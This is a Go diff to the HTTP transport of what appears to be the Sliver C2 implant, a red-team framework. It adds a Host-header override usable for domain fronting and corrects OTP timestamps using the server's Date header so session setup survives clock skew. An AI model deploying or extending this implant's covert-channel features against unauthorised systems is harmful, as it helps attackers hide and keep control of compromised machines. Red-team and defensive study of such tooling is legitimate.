@@ -58,6 +58,7 @@ const (
 var (
 	ErrClosed               = errors.New("http session closed")
 	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
+	TimeDelta time.Duration = 0
 )
 
 // HTTPOptions - c2 specific configuration options
@@ -70,6 +71,7 @@ type HTTPOptions struct {
 	ForceHTTP            bool
 	DisableAcceptHeader  bool
 	DisableUpgradeHeader bool
+	HostHeader           string
 
 	ProxyConfig   string
 	ProxyUsername string
@@ -109,6 +111,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
 		DisableAcceptHeader:  c2URI.Query().Get("disable-accept-header") == "true",
 		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
+		HostHeader:           c2URI.Query().Get("host-header"),
 
 		ProxyConfig:   c2URI.Query().Get("proxy"),
 		ProxyUsername: c2URI.Query().Get("proxy-username"),
@@ -221,6 +224,9 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
+	if s.Options.HostHeader != "" {
+		req.Host = s.Options.HostHeader
+	}
 	req.Header.Set("User-Agent", userAgent)
 	if method == http.MethodGet && !s.Options.DisableAcceptHeader {
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
@@ -329,7 +335,8 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 
 	uri := s.startSessionURL()
 	s.NonceQueryArgument(uri, nonce)
-	otpCode := cryptography.GetOTPCode()
+	timestamp := time.Now().UTC().Add(TimeDelta)
+	otpCode := cryptography.GetExactOTPCode(timestamp)
 	s.OTPQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
@@ -344,6 +351,15 @@ func (s *SliverHTTPClient) establishSessionID(sessionInit []byte) error {
 		return err
 	}
 	if resp.StatusCode != http.StatusOK {
+		serverDateHeader := resp.Header.Get("Date")
+		if serverDateHeader != "" {
+				// If the request failed and there is a Date header, find the time difference and save it for the next request
+				curTime := time.Now().UTC()
+				serverTime, err := time.Parse(time.RFC1123, serverDateHeader)
+				if err == nil {
+					TimeDelta = serverTime.UTC().Sub(curTime)
+				}
+		}
 		// {{if .Config.Debug}}
 		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
 		// {{end}}
